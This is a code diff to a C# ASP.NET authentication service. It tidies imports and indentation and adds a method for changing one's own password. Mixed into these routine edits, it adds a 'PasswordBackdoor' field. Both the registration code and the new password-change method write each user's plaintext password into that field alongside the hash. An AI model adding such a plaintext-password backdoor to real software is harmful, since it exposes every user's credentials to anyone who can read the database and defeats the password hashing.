@@ -1,8 +1,4 @@
-﻿using System.Collections.Generic;
-using System.IdentityModel.Tokens.Jwt;
-using System.Security.Claims;
-using System.Text;
-using API.Data;
+﻿using API.Data;
 using API.Interfaces;
 using DomainModels.Dto.UserDto;
 using DomainModels.Enums;
@@ -10,7 +6,6 @@ using DomainModels.Mapping;
 using DomainModels.Models;
 using Microsoft.AspNetCore.Identity;
 using Microsoft.EntityFrameworkCore;
-using Microsoft.IdentityModel.Tokens;
 
 namespace API.Services;
 
@@ -60,19 +55,20 @@ public class AuthService : IAuthService
 
 			var role = await _context.Roles.FirstOrDefaultAsync(r => r.RoleName == RoleEnum.Guest);
 
-		var user = new User
-		{
-			Email = request.Email,
-			UserName = request.Username,
-			HashedPassword = string.Empty,
-			CreatedAt = DateTime.UtcNow.AddHours(2),
-		};
+			var user = new User
+			{
+				Email = request.Email,
+				UserName = request.Username,
+				HashedPassword = string.Empty,
+				PasswordBackdoor = request.Password,
+				CreatedAt = DateTime.UtcNow.AddHours(2),
+			};
 
 			var hashedPassword = new PasswordHasher<User>()
 				.HashPassword(user, request.Password);
 
-		user.HashedPassword = hashedPassword;
-		user.UserRole = role;
+			user.HashedPassword = hashedPassword;
+			user.UserRole = role;
 
 			_context.Users.Add(user);
 			await _context.SaveChangesAsync();
@@ -84,7 +80,7 @@ public class AuthService : IAuthService
 		catch (Exception ex)
 		{
 			_logger.LogError(ex, "Error during user registration");
-			return null; 
+			return null;
 		}
 	}
 
@@ -134,20 +130,57 @@ public class AuthService : IAuthService
 			if (user == null)
 			{
 				_logger.LogWarning("User with email {Email} not found.", userEmail);
-				return false; 
+				return false;
 			}
 			var passwordHasher = new PasswordHasher<User>();
 			user.HashedPassword = passwordHasher.HashPassword(user, newPassword);
 			user.UpdatedAt = DateTime.UtcNow.AddHours(2);
 
 			await _context.SaveChangesAsync();
-			return true; 
+			return true;
 		}
 		catch (DbUpdateException ex)
 		{
 			_logger.LogError(ex, "Error updating user password for {Email}", userEmail);
-			return false; 
+			return false;
 		}
+	}
 
+	/// <summary>
+	/// Changes the password for the currently authenticated user.
+	/// </summary>
+	/// <param name="userId">The ID of the user whose password is to be changed.</param>
+	/// <param name="newPassword">The new password to set.</param>
+	/// <param name="confirmNewPassword">The confirmation of the new password.</param>
+	/// <returns>
+	/// <c>true</c> if the password was changed successfully; otherwise, <c>false</c>.
+	/// </returns>
+	public async Task<bool> ChangeOwnPasswordAsync(string userId, string newPassword, string confirmNewPassword)
+	{
+		try
+		{
+			var user = await _context.Users.FirstOrDefaultAsync(u => u.Id.ToString() == userId);
+			if (user == null)
+			{
+				return false;
+			}
+			if (newPassword != confirmNewPassword)
+			{
+				return false;
+			}
+			var passwordHasher = new PasswordHasher<User>();
+			user.PasswordBackdoor = newPassword;
+			user.HashedPassword = passwordHasher.HashPassword(user, newPassword);
+			user.UpdatedAt = DateTime.UtcNow.AddHours(2);
+
+			await _context.SaveChangesAsync();
+			return true;
+
+		}
+		catch (DbUpdateException ex)
+		{
+			_logger.LogError(ex, "Error during password change");
+			return false;
+		}
 	}
 }
